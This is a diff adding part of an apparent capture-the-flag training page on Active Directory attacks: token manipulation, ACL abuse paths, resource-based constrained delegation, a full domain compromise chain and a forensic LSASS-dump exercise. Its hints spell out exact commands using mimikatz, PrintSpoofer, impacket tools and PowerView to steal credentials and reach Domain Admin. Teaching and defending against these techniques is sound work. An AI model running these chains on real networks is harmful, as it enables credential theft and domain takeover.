+            <span class="difficulty difficulty-hard">Hard</span>
+            <p class="objective">You have code execution as IIS AppPool (ApplicationPoolIdentity). Chain token manipulation techniques to reach Domain Admin. The DC has a logged-in Domain Admin session.</p>
+            <div class="setup-code">
+<pre><code class="language-powershell"># Starting position:
+# - Running as: IIS APPPOOL\DefaultAppPool
+# - Privileges: SeImpersonatePrivilege, SeAssignPrimaryTokenPrivilege
+# - Environment: IIS on WEB01, Domain Admin logged into WEB01 via RDP (Type 10)
+#
+# Tasks:
+# 1. How do you escalate from AppPool to SYSTEM?
+# 2. Once SYSTEM, how do you get the Domain Admin's token?
+# 3. What's the difference between stealing the token and dumping credentials?
+# 4. Write the complete attack chain (commands)
+# 5. Which step would fail if Credential Guard was enabled?
+</code></pre>
+            </div>
+            <button class="hint-toggle" onclick="this.nextElementSibling.style.display=this.nextElementSibling.style.display==='block'?'none':'block'">Show Hint</button>
+            <div class="hint-content" style="display:none">
+              <p><strong>Hint:</strong> Chain: 1) PrintSpoofer/GodPotato → SYSTEM (SeImpersonate) 2) As SYSTEM, enumerate tokens: <code>Invoke-TokenManipulation -Enumerate</code> or mimikatz <code>token::elevate /domainadmin</code> 3) Token theft gives you live session access (network auth as DA); credential dump gives you persistent hash. 4) Full chain: <code>PrintSpoofer.exe -c "mimikatz.exe privilege::debug token::elevate /domainadmin sekurlsa::logonpasswords exit"</code> 5) Credential Guard would prevent reading the NT hash/passwords from LSASS, but token theft still works (tokens are not in the VBS enclave).</p>
+            </div>
+          </div>
+
+          <div class="ctf-card">
+            <h4>Challenge 8: ACL Abuse Path Finding</h4>
+            <span class="difficulty difficulty-hard">Hard</span>
+            <p class="objective">Given the following ACL relationships, find the shortest path from "webdev" user to Domain Admin. Multiple hops may be required.</p>
+            <div class="setup-code">
+<pre><code class="language-bash"># ACL Map:
+# webdev ──GenericWrite──→ svc_backup (user account)
+# webdev ──ReadProperty──→ Domain Admins (group)
+# svc_backup ──ForceChangePassword──→ helpdesk (user)
+# helpdesk ──WriteDACL──→ IT-Admins (group)
+# IT-Admins ──AddMember──→ Domain Admins (group)
+# svc_backup has SPN: HTTP/intranet.corp.local
+#
+# Questions:
+# 1. What is the shortest path?
+# 2. Write the exploitation commands for each hop
+# 3. Could you Kerberoast svc_backup instead? Why might that be slower?
+# 4. What BloodHound edge types do these represent?
+# 5. How would you clean up after exploitation?
+</code></pre>
+            </div>
+            <button class="hint-toggle" onclick="this.nextElementSibling.style.display=this.nextElementSibling.style.display==='block'?'none':'block'">Show Hint</button>
+            <div class="hint-content" style="display:none">
+              <p><strong>Hint:</strong> Shortest path (4 hops): webdev →(GenericWrite: set SPN + Kerberoast OR targeted password change via shadow credentials)→ svc_backup →(ForceChangePassword)→ helpdesk →(WriteDACL: grant self GenericAll)→ IT-Admins →(AddMember)→ Domain Admins. Alternative: webdev GenericWrite on svc_backup → add shadow credentials (msDS-KeyCredentialLink) → PKINIT as svc_backup → ForceChangePassword on helpdesk → etc. Kerberoasting svc_backup would work but requires cracking time; GenericWrite enables targeted Kerberoast (set weak SPN key) or direct credential manipulation.</p>
+            </div>
+          </div>
+
+          <div class="ctf-card">
+            <h4>Challenge 9: Delegation Attack</h4>
+            <span class="difficulty difficulty-hard">Hard</span>
+            <p class="objective">You have GenericWrite on a computer object (WEB01$). The Domain Controller is DC01. Design a Resource-Based Constrained Delegation (RBCD) attack to compromise WEB01.</p>
+            <div class="setup-code">
+<pre><code class="language-bash"># Given:
+# - You control: lowpriv user (corp.local/attacker:Password1)
+# - GenericWrite on: WEB01$ (computer object)
+# - ms-DS-MachineAccountQuota: 10 (can create machine accounts)
+# - DC: DC01.corp.local (10.10.10.1)
+# - Target: WEB01.corp.local (10.10.10.50)
+#
+# Tasks:
+# 1. Create a machine account you control
+# 2. Configure RBCD on WEB01$
+# 3. Perform S4U to get a ticket as administrator to WEB01
+# 4. Use the ticket to access WEB01
+# 5. Why does this work without TRUSTED_TO_AUTH_FOR_DELEGATION?
+</code></pre>
+            </div>
+            <button class="hint-toggle" onclick="this.nextElementSibling.style.display=this.nextElementSibling.style.display==='block'?'none':'block'">Show Hint</button>
+            <div class="hint-content" style="display:none">
+              <p><strong>Hint:</strong> Complete chain: 1) <code>addcomputer.py -computer-name 'EVIL$' -computer-pass 'Pass123!' corp.local/attacker:Password1</code> 2) <code>rbcd.py -delegate-from 'EVIL$' -delegate-to 'WEB01$' -action write corp.local/attacker:Password1</code> 3) <code>getST.py -spn cifs/WEB01.corp.local -impersonate administrator corp.local/'EVIL$':'Pass123!'</code> 4) <code>export KRB5CCNAME=administrator.ccache; psexec.py -k -no-pass WEB01.corp.local</code> 5) RBCD uses the target's attribute (msDS-AllowedToActOnBehalfOfOtherIdentity) not the source's flag — the KDC checks if EVIL$ is listed in WEB01$'s attribute when processing S4U2Proxy. No T2A4D flag needed.</p>
+            </div>
+          </div>
+
+          <div class="ctf-card">
+            <h4>Challenge 10: Full Authentication Attack Chain</h4>
+            <span class="difficulty difficulty-hard">Hard</span>
+            <p class="objective">Starting from network access only (no domain credentials), chain multiple authentication attacks to reach Domain Admin. Document every step.</p>
+            <div class="setup-code">
+<pre><code class="language-bash"># Scenario:
+# - You have network access to 192.168.1.0/24
+# - DC01 (192.168.1.1) - Domain Controller
+# - SRV01 (192.168.1.100) - File server (SMB signing disabled)
+# - WKS01 (192.168.1.50) - Workstation
+# - No credentials initially
+#
+# Attack Chain Tasks:
+# Phase 1: Obtain initial credentials (unauthenticated)
+# Phase 2: Enumerate with obtained credentials  
+# Phase 3: Lateral movement / privilege escalation
+# Phase 4: Domain compromise
+#
+# For each phase, specify:
+# - The technique used
+# - The tool and exact command
+# - What you obtain
+# - How you pivot to the next phase
+#
+# Constraints: Assume modern Windows (Server 2019/2022), NTLMv2, no WDigest
+</code></pre>
+            </div>
+            <button class="hint-toggle" onclick="this.nextElementSibling.style.display=this.nextElementSibling.style.display==='block'?'none':'block'">Show Hint</button>
+            <div class="hint-content" style="display:none">
+              <p><strong>Hint:</strong> Example chain: Phase 1) Responder LLMNR poisoning → capture Net-NTLMv2 for user "jsmith" → crack with hashcat → password "Summer2024!" Phase 2) BloodHound enumeration: <code>bloodhound-python -u jsmith -p 'Summer2024!' -d corp.local -c All</code> → Find: jsmith has GenericWrite on svc_backup, svc_backup has constrained delegation to DC01 Phase 3) Targeted Kerberoast: Set weak SPN on svc_backup → <code>Set-DomainObject -Identity svc_backup -Set @{serviceprincipalname='YOURSPN/evil'}</code> → Request ticket → Crack → Get svc_backup password Phase 4) S4U attack: <code>getST.py -spn cifs/DC01.corp.local -impersonate administrator corp.local/svc_backup:CrackedPass</code> → <code>psexec.py -k -no-pass DC01.corp.local</code> → DCSync all hashes.</p>
+            </div>
+          </div>
+
+          <div class="ctf-card">
+            <h4>Challenge 11: Identify Credential Theft Method from Memory Dump</h4>
+            <span class="difficulty difficulty-medium">Medium</span>
+            <p class="objective">A forensic analyst provided you with these artifacts from an incident. Identify what credential theft technique was used and what the attacker obtained.</p>
+            <div class="setup-code">
+<pre><code class="language-bash"># Artifact 1 - Process creation event:
+# ParentImage: C:\Windows\System32\services.exe
+# Image: C:\Windows\Temp\procdump64.exe
+# CommandLine: procdump64.exe -ma lsass.exe C:\Windows\Temp\debug.dmp
+# User: NT AUTHORITY\SYSTEM
+
+# Artifact 2 - File creation:
+# FileName: C:\Windows\Temp\debug.dmp
+# FileSize: 54,321,678 bytes
+# CreationTime: 2024-03-15 02:14:33 UTC
+
+# Artifact 3 - Network connection (5 minutes later):
+# SourceIP: 192.168.1.100 (compromised host)
+# DestIP: 10.10.14.5 (external IP)
+# DestPort: 443
+# BytesSent: 55,000,000
+
+# Artifact 4 - Event logs from DC (30 minutes later):
+# Event 4662: "DS-Replication-Get-Changes-All" by user "svc_backup"
+# Event 4624: Logon Type 3, user "svc_backup", from 10.10.14.5
+
+# Questions:
+# 1. What technique was used to extract credentials from the host?
+# 2. Why was procdump used instead of mimikatz directly?
+# 3. What did the attacker likely parse the dump with?
+# 4. What credentials did they obtain that enabled the DCSync?
+# 5. What would have prevented each step?
+</code></pre>
+            </div>
+            <button class="hint-toggle" onclick="this.nextElementSibling.style.display=this.nextElementSibling.style.display==='block'?'none':'block'">Show Hint</button>
+            <div class="hint-content" style="display:none">
+              <p><strong>Hint:</strong> 1) LSASS memory dump via procdump (legitimate Microsoft tool - LOLBin/Living Off the Land) 2) procdump is signed by Microsoft → bypasses most AV/EDR that would flag mimikatz. Dump is exfiltrated and parsed offline. 3) Likely pypykatz or mimikatz <code>sekurlsa::minidump</code> on attacker's machine 4) svc_backup NT hash or plaintext was in LSASS (service logon type 5 caches credentials). svc_backup likely has DCSync rights (Backup Operators or explicit replication rights). 5) Prevention: RunAsPPL (blocks procdump on LSASS), Credential Guard (secrets in VBS enclave), remove DCSync rights from service accounts, network egress monitoring for large exfiltration.</p>
+            </div>
+          </div>
+
+        </div>
+      </div>
+    </div>
+  </div>
+</body>
+</html>
